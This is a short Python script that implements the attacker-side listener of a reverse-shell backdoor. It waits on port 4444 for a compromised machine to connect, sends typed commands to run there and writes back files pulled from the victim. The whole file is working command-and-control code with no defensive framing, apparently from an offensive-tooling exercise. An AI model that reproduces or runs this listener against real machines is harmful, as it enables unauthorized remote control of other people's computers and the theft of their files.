#!/usr/bin/python3
import socket
import json
import base64
import json_communicate as comms


class Listener:
    def __init__(self, ip, port):
        listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        listener.bind((ip, port))
        listener.listen(0)
        print("[+] Waiting for incoming connections")
        self.connection, address = listener.accept()
        print("[+] Got a connection from " + str(address))

    def execute_remotely(self, command):
        comms.send(self.connection, command)

        if command[0] == "exit":
            self.connection.close()
            exit()

        return comms.receive(self.connection)

    def write_file(self, path, content):
        with open(path, 'wb') as file:
            file.write(base64.b64decode(content))
            return "[+] Download succesful."

    def run(self):
        while True:
            command = input(">> ")
            command = command.split(" ")
            result = self.execute_remotely(command)
            if command[0] == "download":
                result = self.write_file(command[2], result)
            print (result)
            

my_listener = Listener("localhost", 4444)
my_listener.run()